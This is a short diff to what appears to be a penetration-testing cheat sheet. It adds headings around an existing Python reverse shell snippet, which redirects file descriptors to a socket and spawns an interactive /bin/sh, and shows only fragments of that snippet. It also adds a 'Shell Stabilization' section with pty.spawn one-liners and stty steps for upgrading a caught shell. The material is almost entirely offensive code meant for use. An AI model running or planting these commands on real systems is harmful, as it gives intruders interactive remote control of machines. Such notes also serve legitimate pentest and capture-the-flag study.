@@ -1,3 +1,6 @@
+
+### Python
+
 ```bash
 import socket
 import subprocess
@@ -13,6 +16,19 @@ os.dup2(s.fileno(), 2)
 subprocess.call(["/bin/sh", "-i"])
 ```
 
+### Shell Stabilization
+
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Python 2
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
+# Background shell (Ctrl+Z), then:
+stty raw -echo; fg
+reset
+export TERM=xterm
 ```
